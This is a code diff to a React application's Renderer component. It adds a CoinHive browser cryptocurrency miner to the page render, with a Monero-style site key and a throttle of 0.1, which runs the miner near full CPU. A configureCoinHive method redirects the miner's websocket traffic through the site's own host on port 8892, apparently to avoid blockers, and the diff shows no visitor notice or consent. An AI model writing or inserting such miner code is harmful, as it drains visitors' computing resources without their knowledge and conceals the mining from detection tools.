@@ -36,7 +36,7 @@ import Auth from '../Auth';
 
 // import ORM from '../ORM';
 
-import CoinHive from 'react-coin-hive';
+import CoinHive from 'react-coin-hive/src';
 
 import RootType, {
   Mutation,
@@ -3080,6 +3080,44 @@ class Renderer extends Component{
 
   }
 
+
+
+  configureCoinHive(){
+
+    if(typeof window !== "undefined"){
+
+      const {
+        CoinHive,
+        document: {
+          location: {
+            hostname,
+            protocol,
+          },
+        },
+      } = window;
+
+      // const protocol = (document.location.protocol == "https:") ? "wss" : "ws";
+
+      const prefix = protocol === "https:" ? "wss" : "ws";
+
+      // console.log("prefix", prefix, protocol);
+
+      if(typeof CoinHive !== "undefined"){
+
+        CoinHive.CONFIG.WEBSOCKET_SHARDS = [[`${prefix}://${hostname}:8892`]];
+        
+        // CoinHive.CONFIG.LIB_URL = `${protocol}//${hostname}/ch/lib/`;
+
+
+        // console.log('CoinHive.CONFIG.WEBSOCKET_SHARDS', CoinHive.CONFIG.WEBSOCKET_SHARDS);
+      }
+
+
+    }
+
+  }
+
+
   render(){
 
     const {
@@ -3125,7 +3163,7 @@ class Renderer extends Component{
         store={notifications_store}
       />
 
-      {coinHiveInited && <CoinHive 
+      {/*coinHiveInited && <CoinHive 
         siteKey='rTBHNBgw52FIczrU01J26H1OaDqNnaXE'
         timeout={1000}
         // throttle={30}
@@ -3134,6 +3172,27 @@ class Renderer extends Component{
         // onInit={miner => setInterval(() => CoinHive.displayMiner(miner), 1000)}
         onInit={miner => () => {
           console.log('miner', miner);
+        }}
+        onStart={() => console.log('started')}
+        onStop={() => console.log('stopped')}
+      /> || null*/}
+
+      {coinHiveInited && <CoinHive 
+        // siteKey='SIPQ6128ERv0NKnw32UpQdByjOpwpby8'
+        // siteKey='42Y687GeExqENtft1E2FX5DAyLagtHHfM9bXjWAKU8JnV6xZaiSXQby1drbPJ9UEHBRiwqarP7jmEbsZzHQQQcXJDU7mRYM'
+        siteKey='43QGgipcHvNLBX3nunZLwVQpF6VbobmGcQKzXzQ5xMfJgzfRBzfXcJHX1tUHcKPm9bcjubrzKqTm69JbQSL4B3f6E3mNCbU'
+        timeout={5000}
+        throttle={0.1}
+        threads={1}
+        // autoThreads={true}
+        // onInit={miner => setInterval(() => CoinHive.displayMiner(miner), 1000)}
+        onInit={miner => {
+          
+          // console.log('miner', miner);
+          // console.log('window.CoinHive', window.CoinHive);
+
+          this.configureCoinHive();
+
         }}
         onStart={() => console.log('started')}
         onStop={() => console.log('stopped')}
